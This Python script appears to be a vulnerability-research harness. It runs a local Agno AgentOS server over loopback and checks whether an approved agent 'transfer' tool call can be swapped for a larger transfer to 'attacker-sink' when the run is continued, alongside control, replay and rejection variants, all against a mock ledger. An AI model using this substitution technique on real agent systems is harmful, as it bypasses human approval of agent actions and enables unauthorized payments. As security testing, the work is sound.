"""Run the Agno AgentOS approval-binding matrix over real loopback HTTP."""

from __future__ import annotations

import argparse
import copy
import hashlib
import json
import os
import platform
import socket
import subprocess
import sys
import time
from datetime import datetime, timezone
from importlib import metadata
from pathlib import Path
from typing import Any, Callable

import httpx
import jwt


TEST_JWT_KEY = "loopjacking-test-key-not-a-secret"
A_AMOUNT = 20
A_RECIPIENT = "approved-vendor"
B_AMOUNT = 2000
B_RECIPIENT = "attacker-sink"
AGENT_ID = "transfer-agent"


def utc_now() -> str:
    return datetime.now(timezone.utc).isoformat()


def write_json(path: Path, value: Any) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(value, indent=2, sort_keys=True) + "\n", encoding="utf-8")


def append_jsonl(path: Path, value: Any) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("a", encoding="utf-8") as handle:
        handle.write(json.dumps(value, sort_keys=True) + "\n")


def read_jsonl(path: Path) -> list[dict[str, Any]]:
    if not path.exists():
        return []
    return [json.loads(line) for line in path.read_text(encoding="utf-8").splitlines() if line.strip()]


def free_loopback_port() -> int:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind(("127.0.0.1", 0))
        return int(sock.getsockname()[1])


def mint_token(subject: str, scopes: list[str]) -> str:
    now = int(time.time())
    return jwt.encode(
        {"sub": subject, "scopes": scopes, "iat": now - 5, "exp": now + 3600},
        TEST_JWT_KEY,
        algorithm="HS256",
    )


class Harness:
    def __init__(self, base_url: str, evidence_dir: Path) -> None:
        self.base_url = base_url
        self.evidence_dir = evidence_dir
        self.http_log = evidence_dir / "http-transactions.jsonl"
        self.ledger_path = evidence_dir / "mock-ledger.jsonl"
        self.notes_path = evidence_dir / "runner-notes.jsonl"
        self.results: list[dict[str, Any]] = []
        self.counter = 0
        self.tokens = {
            "maker": mint_token("maker-user", ["agents:run"]),
            "approver": mint_token("approval-admin", ["agent_os:admin"]),
            "wrong_user": mint_token("different-maker", ["agents:run"]),
            "outsider": mint_token("outsider", ["config:read"]),
        }
        self.client = httpx.Client(base_url=base_url, timeout=30.0)

    def close(self) -> None:
        self.client.close()

    def note(self, event: str, **details: Any) -> None:
        row = {"at": utc_now(), "event": event, **details}
        append_jsonl(self.notes_path, row)
        print(json.dumps(row, sort_keys=True), flush=True)

    def request(self, actor: str, method: str, path: str, **kwargs: Any) -> tuple[int, Any]:
        headers = dict(kwargs.pop("headers", {}))
        headers["Authorization"] = f"Bearer {self.tokens[actor]}"
        started_ns = time.time_ns()
        response = self.client.request(method, path, headers=headers, **kwargs)
        elapsed_ns = time.time_ns() - started_ns
        try:
            body: Any = response.json()
        except Exception:
            body = response.text
        safe_request = {
            "actor": actor,
            "method": method,
            "path": path,
            "params": kwargs.get("params"),
            "data": kwargs.get("data"),
            "json": kwargs.get("json"),
        }
        append_jsonl(
            self.http_log,
            {
                "at": utc_now(),
                "elapsed_ns": elapsed_ns,
                "request": safe_request,
                "response": {
                    "status_code": response.status_code,
                    "content_type": response.headers.get("content-type"),
                    "body": body,
                },
            },
        )
        return response.status_code, body

    def new_case(self, prefix: str) -> str:
        self.counter += 1
        return f"{prefix}-{self.counter:03d}"

    def ledger_for(self, request_id: str) -> list[dict[str, Any]]:
        return [event for event in read_jsonl(self.ledger_path) if event.get("request_id") == request_id]

    @staticmethod
    def extract_tool(run: dict[str, Any]) -> dict[str, Any]:
        for requirement in run.get("requirements") or []:
            tool = requirement.get("tool_execution")
            if tool:
                return copy.deepcopy(tool)
        tools = run.get("tools") or []
        if tools:
            return copy.deepcopy(tools[0])
        raise AssertionError(f"No tool execution found in run keys={sorted(run)}")

    def approvals_for(self, run_id: str) -> list[dict[str, Any]]:
        status, body = self.request(
            "approver",
            "GET",
            "/approvals",
            params={"run_id": run_id, "limit": 100},
        )
        if status != 200:
            raise AssertionError(f"Approval list failed: {status} {body}")
        if isinstance(body, dict) and isinstance(body.get("data"), list):
            return body["data"]
        if isinstance(body, dict) and isinstance(body.get("approvals"), list):
            return body["approvals"]
        raise AssertionError(f"Unknown approval-list shape: {body}")

    def start(self, request_id: str, *, direct_b: bool = False) -> dict[str, Any]:
        session_id = f"session-{request_id}"
        message = f"CASE={request_id} {'DIRECT_B' if direct_b else 'PROPOSE_A'}"
        status, run = self.request(
            "maker",
            "POST",
            f"/agents/{AGENT_ID}/runs",
            data={"message": message, "session_id": session_id, "stream": "false"},
        )
        if status != 200 or not isinstance(run, dict):
            raise AssertionError(f"Start failed: {status} {run}")
        if str(run.get("status", "")).lower() != "paused":
            raise AssertionError(f"Run did not pause: {run}")
        tool = self.extract_tool(run)
        approvals = self.approvals_for(str(run["run_id"]))
        if len(approvals) != 1:
            raise AssertionError(f"Expected one approval, found {len(approvals)}: {approvals}")
        return {
            "request_id": request_id,
            "session_id": session_id,
            "run": run,
            "run_id": str(run["run_id"]),
            "tool": tool,
            "approval": approvals[0],
        }

    def resolve(self, approval_id: str, status_value: str, actor: str = "approver") -> tuple[int, Any]:
        return self.request(
            actor,
            "POST",
            f"/approvals/{approval_id}/resolve",
            json={"status": status_value},
        )

    def continue_with(
        self,
        case: dict[str, Any],
        tool: dict[str, Any] | None,
        *,
        actor: str = "maker",
        session_id: str | None = None,
    ) -> tuple[int, Any]:
        tools = "" if tool is None else json.dumps([tool], sort_keys=True)
        return self.request(
            actor,
            "POST",
            f"/agents/{AGENT_ID}/runs/{case['run_id']}/continue",
            data={"tools": tools, "session_id": session_id or case["session_id"], "stream": "false"},
        )

    @staticmethod
    def confirmed_tool(
        original: dict[str, Any],
        *,
        amount: int,
        recipient: str,
        request_id: str,
    ) -> dict[str, Any]:
        tool = copy.deepcopy(original)
        tool["tool_args"] = {
            "amount": amount,
            "recipient": recipient,
            "request_id": request_id,
        }
        tool["confirmed"] = True
        tool["result"] = None
        tool["tool_call_error"] = None
        return tool

    def run_trial(self, name: str, function: Callable[[], dict[str, Any]]) -> None:
        self.note("trial_started", trial=name)
        try:
            result = function()
            row = {"trial": name, "completed": True, **result}
        except Exception as exc:
            row = {
                "trial": name,
                "completed": False,
                "error_type": type(exc).__name__,
                "error": str(exc),
            }
        self.results.append(row)
        self.note("trial_finished", **row)


def approval_is(approval: dict[str, Any], amount: int, recipient: str, request_id: str) -> bool:
    return approval.get("tool_name") == "transfer" and approval.get("tool_args") == {
        "amount": amount,
        "recipient": recipient,
        "request_id": request_id,
    }


def run_trials(h: Harness) -> None:
    def pending_rbac() -> dict[str, Any]:
        request_id = h.new_case("pending-rbac")
        case = h.start(request_id)
        forged_b = h.confirmed_tool(
            case["tool"], amount=B_AMOUNT, recipient=B_RECIPIENT, request_id=request_id
        )
        maker_resolve, _ = h.resolve(case["approval"]["id"], "approved", actor="maker")
        maker_pending, _ = h.continue_with(case, forged_b, actor="maker")
        wrong_user, _ = h.continue_with(case, forged_b, actor="wrong_user")
        outsider, _ = h.continue_with(case, forged_b, actor="outsider")
        return {
            "request_id": request_id,
            "approval_shows_a": approval_is(case["approval"], A_AMOUNT, A_RECIPIENT, request_id),
            "maker_resolve_status": maker_resolve,
            "maker_pending_continue_status": maker_pending,
            "wrong_user_status": wrong_user,
            "outsider_status": outsider,
            "ledger": h.ledger_for(request_id),
            "oracle_pass": (
                maker_resolve in {403, 404}
                and maker_pending == 403
                and wrong_user in {403, 404}
                and outsider == 403
                and h.ledger_for(request_id) == []
            ),
        }

    h.run_trial("control_pending_rbac", pending_rbac)

    for index in range(3):
        def direct_b(index: int = index) -> dict[str, Any]:
            request_id = h.new_case(f"direct-b-{index + 1}")
            case = h.start(request_id, direct_b=True)
            forged = h.confirmed_tool(
                case["tool"], amount=B_AMOUNT, recipient=B_RECIPIENT, request_id=request_id
            )
            resolve_status, _ = h.resolve(case["approval"]["id"], "approved", actor="maker")
            pending_status, _ = h.continue_with(case, forged, actor="maker")
            ledger = h.ledger_for(request_id)
            return {
                "request_id": request_id,
                "approval_shows_b": approval_is(case["approval"], B_AMOUNT, B_RECIPIENT, request_id),
                "maker_resolve_status": resolve_status,
                "maker_pending_continue_status": pending_status,
                "ledger": ledger,
                "oracle_pass": (
                    approval_is(case["approval"], B_AMOUNT, B_RECIPIENT, request_id)
                    and resolve_status in {403, 404}
                    and pending_status == 403
                    and ledger == []
                ),
            }

        h.run_trial(f"control_direct_b_{index + 1}", direct_b)

    for index in range(5):
        def honest_a(index: int = index) -> dict[str, Any]:
            request_id = h.new_case(f"honest-a-{index + 1}")
            case = h.start(request_id)
            approval_before = copy.deepcopy(case["approval"])
            resolve_status, resolved = h.resolve(case["approval"]["id"], "approved")
            tool = h.confirmed_tool(
                case["tool"], amount=A_AMOUNT, recipient=A_RECIPIENT, request_id=request_id
            )
            continue_status, continued = h.continue_with(case, tool)
            ledger = h.ledger_for(request_id)
            approvals_after = h.approvals_for(case["run_id"])
            exact_a = [event for event in ledger if event.get("amount") == A_AMOUNT and event.get("recipient") == A_RECIPIENT]
            return {
                "request_id": request_id,
                "approval_before": approval_before,
                "approval_resolve_status": resolve_status,
                "resolved_approval": resolved,
                "continue_status": continue_status,
                "continued_status": continued.get("status") if isinstance(continued, dict) else None,
                "approvals_after": approvals_after,
                "ledger": ledger,
                "oracle_pass": (
                    approval_is(approval_before, A_AMOUNT, A_RECIPIENT, request_id)
                    and resolve_status == 200
                    and continue_status == 200
                    and len(exact_a) == 1
                    and len(ledger) == 1
                ),
            }

        h.run_trial(f"control_honest_a_{index + 1}", honest_a)

    for index in range(5):
        def attack(index: int = index) -> dict[str, Any]:
            request_id = h.new_case(f"attack-a-to-b-{index + 1}")
            case = h.start(request_id)
            approval_before = copy.deepcopy(case["approval"])
            resolve_status, resolved = h.resolve(case["approval"]["id"], "approved")
            b_tool = h.confirmed_tool(
                case["tool"], amount=B_AMOUNT, recipient=B_RECIPIENT, request_id=request_id
            )
            continue_status, continued = h.continue_with(case, b_tool)
            ledger = h.ledger_for(request_id)
            approvals_after = h.approvals_for(case["run_id"])
            b_events = [event for event in ledger if event.get("amount") == B_AMOUNT and event.get("recipient") == B_RECIPIENT]
            b_approvals = [
                item for item in approvals_after if approval_is(item, B_AMOUNT, B_RECIPIENT, request_id)
            ]
            observed = (
                approval_is(approval_before, A_AMOUNT, A_RECIPIENT, request_id)
                and resolve_status == 200
                and continue_status == 200
                and len(b_events) == 1
                and len(ledger) == 1
                and not b_approvals
            )
            return {
                "request_id": request_id,
                "approval_before": approval_before,
                "approval_resolve_status": resolve_status,
                "resolved_approval": resolved,
                "submitted_tool": b_tool,
                "continue_status": continue_status,
                "continued_status": continued.get("status") if isinstance(continued, dict) else None,
                "approvals_after": approvals_after,
                "ledger": ledger,
                "attack_observed": observed,
            }

        h.run_trial(f"attack_approved_a_to_b_{index + 1}", attack)

    def attack_without_approval_id() -> dict[str, Any]:
        request_id = h.new_case("attack-no-approval-id")
        case = h.start(request_id)
        approval_before = copy.deepcopy(case["approval"])
        resolve_status, _ = h.resolve(case["approval"]["id"], "approved")
        b_tool = h.confirmed_tool(case["tool"], amount=B_AMOUNT, recipient=B_RECIPIENT, request_id=request_id)
        b_tool["approval_id"] = None
        continue_status, continued = h.continue_with(case, b_tool)
        ledger = h.ledger_for(request_id)
        return {
            "request_id": request_id,
            "approval_shows_a": approval_is(approval_before, A_AMOUNT, A_RECIPIENT, request_id),
            "approval_resolve_status": resolve_status,
            "continue_status": continue_status,
            "continued": continued,
            "ledger": ledger,
            "attack_observed": any(
                event.get("amount") == B_AMOUNT and event.get("recipient") == B_RECIPIENT for event in ledger
            ),
        }

    h.run_trial("variant_attack_without_approval_id", attack_without_approval_id)

    def attack_new_tool_call_id() -> dict[str, Any]:
        request_id = h.new_case("attack-new-call-id")
        case = h.start(request_id)
        resolve_status, _ = h.resolve(case["approval"]["id"], "approved")
        b_tool = h.confirmed_tool(case["tool"], amount=B_AMOUNT, recipient=B_RECIPIENT, request_id=request_id)
        b_tool["tool_call_id"] = f"replacement-{request_id}"
        continue_status, continued = h.continue_with(case, b_tool)
        ledger = h.ledger_for(request_id)
        return {
            "request_id": request_id,
            "approval_resolve_status": resolve_status,
            "continue_status": continue_status,
            "continued": continued,
            "ledger": ledger,
            "attack_observed": any(
                event.get("amount") == B_AMOUNT and event.get("recipient") == B_RECIPIENT for event in ledger
            ),
        }

    h.run_trial("variant_attack_new_tool_call_id", attack_new_tool_call_id)

    def attack_wrong_session() -> dict[str, Any]:
        request_id = h.new_case("attack-wrong-session")
        case = h.start(request_id)
        resolve_status, _ = h.resolve(case["approval"]["id"], "approved")
        b_tool = h.confirmed_tool(case["tool"], amount=B_AMOUNT, recipient=B_RECIPIENT, request_id=request_id)
        continue_status, continued = h.continue_with(
            case,
            b_tool,
            session_id=f"wrong-{case['session_id']}",
        )
        ledger = h.ledger_for(request_id)
        return {
            "request_id": request_id,
            "approval_resolve_status": resolve_status,
            "continue_status": continue_status,
            "continued": continued,
            "ledger": ledger,
            "wrong_session_blocked": continue_status in {403, 404} and ledger == [],
        }

    h.run_trial("variant_attack_wrong_session", attack_wrong_session)

    def rejected_a_to_b() -> dict[str, Any]:
        request_id = h.new_case("rejected-a-to-b")
        case = h.start(request_id)
        resolve_status, resolved = h.resolve(case["approval"]["id"], "rejected")
        b_tool = h.confirmed_tool(case["tool"], amount=B_AMOUNT, recipient=B_RECIPIENT, request_id=request_id)
        continue_status, continued = h.continue_with(case, b_tool)
        ledger = h.ledger_for(request_id)
        return {
            "request_id": request_id,
            "approval_resolve_status": resolve_status,
            "resolved_approval": resolved,
            "continue_status": continue_status,
            "continued": continued,
            "ledger": ledger,
            "rejection_overridden": bool(ledger),
        }

    h.run_trial("variant_rejected_a_to_b", rejected_a_to_b)

    def rejected_a_unchanged() -> dict[str, Any]:
        request_id = h.new_case("rejected-a-unchanged")
        case = h.start(request_id)
        resolve_status, resolved = h.resolve(case["approval"]["id"], "rejected")
        a_tool = h.confirmed_tool(case["tool"], amount=A_AMOUNT, recipient=A_RECIPIENT, request_id=request_id)
        continue_status, continued = h.continue_with(case, a_tool)
        ledger = h.ledger_for(request_id)
        return {
            "request_id": request_id,
            "approval_resolve_status": resolve_status,
            "resolved_approval": resolved,
            "continue_status": continue_status,
            "continued": continued,
            "ledger": ledger,
            "rejection_overridden": bool(ledger),
        }

    h.run_trial("variant_rejected_a_unchanged", rejected_a_unchanged)

    def empty_after_approval() -> dict[str, Any]:
        request_id = h.new_case("empty-after-approval")
        case = h.start(request_id)
        resolve_status, resolved = h.resolve(case["approval"]["id"], "approved")
        continue_status, continued = h.continue_with(case, None)
        return {
            "request_id": request_id,
            "approval_resolve_status": resolve_status,
            "resolved_approval": resolved,
            "continue_status": continue_status,
            "continued": continued,
            "ledger": h.ledger_for(request_id),
        }

    h.run_trial("variant_empty_tools_after_approval", empty_after_approval)

    def replay_after_honest_a() -> dict[str, Any]:
        request_id = h.new_case("replay-after-a")
        case = h.start(request_id)
        resolve_status, _ = h.resolve(case["approval"]["id"], "approved")
        a_tool = h.confirmed_tool(case["tool"], amount=A_AMOUNT, recipient=A_RECIPIENT, request_id=request_id)
        first_status, first = h.continue_with(case, a_tool)
        before_replay = h.ledger_for(request_id)
        replay_status, replay = h.continue_with(case, a_tool)
        after_replay = h.ledger_for(request_id)
        return {
            "request_id": request_id,
            "approval_resolve_status": resolve_status,
            "first_continue_status": first_status,
            "first": first,
            "replay_status": replay_status,
            "replay": replay,
            "ledger_before_replay": before_replay,
            "ledger_after_replay": after_replay,
            "replay_effect_observed": len(after_replay) > len(before_replay),
        }

    h.run_trial("variant_replay_after_honest_a", replay_after_honest_a)

    def completed_run_a_to_b() -> dict[str, Any]:
        request_id = h.new_case("completed-a-to-b")
        case = h.start(request_id)
        approval_before = copy.deepcopy(case["approval"])
        resolve_status, _ = h.resolve(case["approval"]["id"], "approved")
        a_tool = h.confirmed_tool(case["tool"], amount=A_AMOUNT, recipient=A_RECIPIENT, request_id=request_id)
        first_status, first = h.continue_with(case, a_tool)
        ledger_after_a = h.ledger_for(request_id)
        b_tool = h.confirmed_tool(case["tool"], amount=B_AMOUNT, recipient=B_RECIPIENT, request_id=request_id)
        second_status, second = h.continue_with(case, b_tool)
        ledger_final = h.ledger_for(request_id)
        approvals_after = h.approvals_for(case["run_id"])
        b_events = [
            event
            for event in ledger_final
            if event.get("amount") == B_AMOUNT and event.get("recipient") == B_RECIPIENT
        ]
        b_approvals = [
            item for item in approvals_after if approval_is(item, B_AMOUNT, B_RECIPIENT, request_id)
        ]
        return {
            "request_id": request_id,
            "approval_before": approval_before,
            "approval_resolve_status": resolve_status,
            "first_continue_status": first_status,
            "first": first,
            "ledger_after_a": ledger_after_a,
            "submitted_b_tool": b_tool,
            "second_continue_status": second_status,
            "second": second,
            "approvals_after": approvals_after,
            "ledger_final": ledger_final,
            "completed_run_substitution_observed": (
                approval_is(approval_before, A_AMOUNT, A_RECIPIENT, request_id)
                and resolve_status == 200
                and first_status == 200
                and len(ledger_after_a) == 1
                and ledger_after_a[0].get("amount") == A_AMOUNT
                and second_status == 200
                and len(b_events) == 1
                and len(ledger_final) == 2
                and not b_approvals
            ),
        }

    h.run_trial("variant_completed_run_a_to_b", completed_run_a_to_b)

    def safe_exact_action_control() -> dict[str, Any]:
        request_id = h.new_case("safe-control")
        case = h.start(request_id)
        approval_before = copy.deepcopy(case["approval"])
        resolve_status, _ = h.resolve(case["approval"]["id"], "approved")
        b_tool = h.confirmed_tool(case["tool"], amount=B_AMOUNT, recipient=B_RECIPIENT, request_id=request_id)
        approved_descriptor = {
            "tool_name": approval_before.get("tool_name"),
            "tool_args": approval_before.get("tool_args"),
        }
        candidate_descriptor = {"tool_name": b_tool.get("tool_name"), "tool_args": b_tool.get("tool_args")}
        blocked_b = candidate_descriptor != approved_descriptor
        ledger_after_block = h.ledger_for(request_id)
        a_tool = h.confirmed_tool(case["tool"], amount=A_AMOUNT, recipient=A_RECIPIENT, request_id=request_id)
        continue_status, continued = h.continue_with(case, a_tool)
        ledger_final = h.ledger_for(request_id)
        return {
            "request_id": request_id,
            "approval_resolve_status": resolve_status,
            "approved_descriptor": approved_descriptor,
            "candidate_b_descriptor": candidate_descriptor,
            "researcher_control_blocked_b": blocked_b,
            "ledger_after_block": ledger_after_block,
            "continue_a_status": continue_status,
            "continued": continued,
            "ledger_final": ledger_final,
            "oracle_pass": (
                blocked_b
                and ledger_after_block == []
                and len(ledger_final) == 1
                and ledger_final[0].get("amount") == A_AMOUNT
                and ledger_final[0].get("recipient") == A_RECIPIENT
            ),
        }

    h.run_trial("control_exact_action_filter", safe_exact_action_control)


def summarize(results: list[dict[str, Any]]) -> dict[str, Any]:
    attack_rows = [row for row in results if row["trial"].startswith("attack_approved_a_to_b_")]
    honest_rows = [row for row in results if row["trial"].startswith("control_honest_a_")]
    direct_rows = [row for row in results if row["trial"].startswith("control_direct_b_")]
    rbac = next((row for row in results if row["trial"] == "control_pending_rbac"), {})
    safe = next((row for row in results if row["trial"] == "control_exact_action_filter"), {})
    attack_observed = sum(1 for row in attack_rows if row.get("attack_observed") is True)
    honest_pass = sum(1 for row in honest_rows if row.get("oracle_pass") is True)
    direct_pass = sum(1 for row in direct_rows if row.get("oracle_pass") is True)
    required_controls_pass = (
        rbac.get("oracle_pass") is True
        and honest_pass == len(honest_rows) == 5
        and direct_pass == len(direct_rows) == 3
    )
    strict_trace_supported = required_controls_pass and attack_observed == len(attack_rows) == 5
    if strict_trace_supported:
        interpretation = "strict_loopjacking_trace_observed"
    elif required_controls_pass and attack_observed == 0:
        interpretation = "substitution_not_observed_with_controls_valid"
    else:
        interpretation = "indeterminate_or_mixed"
    return {
        "interpretation": interpretation,
        "strict_trace_supported": strict_trace_supported,
        "attack_observed": attack_observed,
        "attack_total": len(attack_rows),
        "honest_a_pass": honest_pass,
        "honest_a_total": len(honest_rows),
        "direct_b_denied_pass": direct_pass,
        "direct_b_total": len(direct_rows),
        "pending_rbac_pass": rbac.get("oracle_pass") is True,
        "custom_safe_control_pass": safe.get("oracle_pass") is True,
        "completed_trials": sum(1 for row in results if row.get("completed") is True),
        "total_trials": len(results),
    }


def source_receipts() -> dict[str, Any]:
    import agno

    package_root = Path(agno.__file__).resolve().parent
    relative_paths = [
        "os/routers/agents/router.py",
        "os/routers/approvals/router.py",
        "os/auth.py",
        "agent/_run.py",
        "agent/_tools.py",
    ]
    receipts: dict[str, Any] = {}
    for relative in relative_paths:
        path = package_root / relative
        receipts[relative] = {
            "sha256": hashlib.sha256(path.read_bytes()).hexdigest(),
            "size": path.stat().st_size,
        }
    return receipts


def dependency_versions() -> dict[str, str]:
    names = ["agno", "fastapi", "uvicorn", "httpx", "PyJWT", "SQLAlchemy", "python-multipart"]
    versions: dict[str, str] = {}
    for name in names:
        try:
            versions[name] = metadata.version(name)
        except metadata.PackageNotFoundError:
            versions[name] = "not-installed"
    return versions


def all_installed_distributions() -> list[dict[str, str]]:
    rows: list[dict[str, str]] = []
    for distribution in metadata.distributions():
        name = distribution.metadata.get("Name") or "unknown"
        rows.append({"name": name, "version": distribution.version})
    return sorted(rows, key=lambda row: (row["name"].lower(), row["version"]))


def harness_receipts() -> dict[str, Any]:
    experiment_dir = Path(__file__).resolve().parent
    receipts: dict[str, Any] = {"files": {}}
    for name in [
        "README.md",
        "run_all.sh",
        "run_boundary.sh",
        "run_matrix.py",
        "run_version.sh",
        "server.py",
    ]:
        path = experiment_dir / name
        receipts["files"][name] = {
            "sha256": hashlib.sha256(path.read_bytes()).hexdigest(),
            "size": path.stat().st_size,
        }
    return receipts


def write_hashes(evidence_dir: Path) -> None:
    rows = []
    for path in sorted(item for item in evidence_dir.rglob("*") if item.is_file() and item.name != "SHA256SUMS"):
        rows.append(f"{hashlib.sha256(path.read_bytes()).hexdigest()}  {path.relative_to(evidence_dir)}")
    (evidence_dir / "SHA256SUMS").write_text("\n".join(rows) + "\n", encoding="utf-8")


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--output-root", type=Path, required=True)
    args = parser.parse_args()

    version = metadata.version("agno")
    started = datetime.now(timezone.utc)
    stamp = started.strftime("%Y%m%dT%H%M%SZ")
    evidence_dir = (args.output_root / f"agno-{version}" / stamp).resolve()
    evidence_dir.mkdir(parents=True, exist_ok=False)
    port = free_loopback_port()
    base_url = f"http://127.0.0.1:{port}"
    server_log = (evidence_dir / "server.log").open("w", encoding="utf-8")
    env = os.environ.copy()
    env.update(
        {
            "LOOPJACKING_JWT_KEY": TEST_JWT_KEY,
            "LOOPJACKING_DB_PATH": str(evidence_dir / "agentos.sqlite"),
            "LOOPJACKING_LEDGER_PATH": str(evidence_dir / "mock-ledger.jsonl"),
            "AGNO_TELEMETRY": "false",
        }
    )
    server = subprocess.Popen(
        [
            sys.executable,
            "-m",
            "uvicorn",
            "server:app",
            "--host",
            "127.0.0.1",
            "--port",
            str(port),
            "--log-level",
            "info",
        ],
        cwd=Path(__file__).resolve().parent,
        env=env,
        stdout=server_log,
        stderr=subprocess.STDOUT,
        text=True,
    )

    harness: Harness | None = None
    try:
        deadline = time.monotonic() + 30
        while time.monotonic() < deadline:
            if server.poll() is not None:
                raise RuntimeError(f"Server exited with {server.returncode}; inspect {server_log.name}")
            try:
                response = httpx.get(f"{base_url}/health", timeout=1.0)
                if response.status_code in {200, 401}:
                    break
            except Exception:
                pass
            time.sleep(0.1)
        else:
            raise RuntimeError("Timed out waiting for local AgentOS server")

        harness = Harness(base_url, evidence_dir)
        harness.note("matrix_started", agno_version=version, base_url=base_url)
        run_trials(harness)
        summary = summarize(harness.results)
        harness.note("matrix_finished", **summary)
        write_json(evidence_dir / "results.json", {"summary": summary, "trials": harness.results})
        write_json(evidence_dir / "source-receipts.json", source_receipts())
        write_json(evidence_dir / "harness-checksums.json", harness_receipts())
        write_json(evidence_dir / "installed-packages.json", all_installed_distributions())
        write_json(
            evidence_dir / "manifest.json",
            {
                "experiment": "agno-agentos-approval-binding",
                "execution_scope": "released package over loopback HTTP",
                "started_at": started.isoformat(),
                "finished_at": utc_now(),
                "target": {"package": "agno", "version": version},
                "python": sys.version,
                "platform": platform.platform(),
                "dependencies": dependency_versions(),
                "transport": {"scheme": "http", "host": "127.0.0.1", "port": port},
                "principals": {
                    "maker": {"sub": "maker-user", "scopes": ["agents:run"]},
                    "approver": {"sub": "approval-admin", "scopes": ["agent_os:admin"]},
                    "wrong_user": {"sub": "different-maker", "scopes": ["agents:run"]},
                    "outsider": {"sub": "outsider", "scopes": ["config:read"]},
                },
                "secrets": "Only a public test JWT key was used; bearer tokens are omitted from HTTP evidence.",
                "external_effects": "none",
                "summary": summary,
            },
        )
        write_json(
            evidence_dir / "claim.json",
            {
                "claim": "Whether released Agno AgentOS consumes admin approval for A while executing caller-substituted B through its regular-Agent HTTP continuation path.",
                "target": f"agno=={version}",
                "result": summary["interpretation"],
                "oracle": {
                    "approved": {"tool": "transfer", "amount": A_AMOUNT, "recipient": A_RECIPIENT},
                    "substituted": {"tool": "transfer", "amount": B_AMOUNT, "recipient": B_RECIPIENT},
                    "strict_trace_supported": summary["strict_trace_supported"],
                },
                "limitations": [
                    "The model and harmless ledger are deterministic local fixtures.",
                    "The approver uses AgentOS's documented admin scope and therefore has broad authority; the attacker does not possess that token.",
                    "The exact-action safe control is researcher-authored, not an Agno fixed version.",
                    "GitHub stars and this local configuration do not establish deployment prevalence.",
                ],
                "contradicting_evidence": [
                    "Any attack cell without a B ledger event is retained in results.json.",
                    "Changed-tool-call-ID and missing-approval-ID variants are recorded separately.",
                ],
                "next_falsifying_experiment": "Independently rerun from this bundle, inspect the first product-owned failed comparison, and test any vendor-provided fixed release or action-bound configuration.",
                "verified_at": utc_now(),
            },
        )
        print(json.dumps({"evidence_dir": str(evidence_dir), "summary": summary}, indent=2), flush=True)
    finally:
        if harness is not None:
            harness.close()
        if server.poll() is None:
            server.terminate()
            try:
                server.wait(timeout=10)
            except subprocess.TimeoutExpired:
                server.kill()
                server.wait(timeout=5)
        server_log.close()
    write_hashes(evidence_dir)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
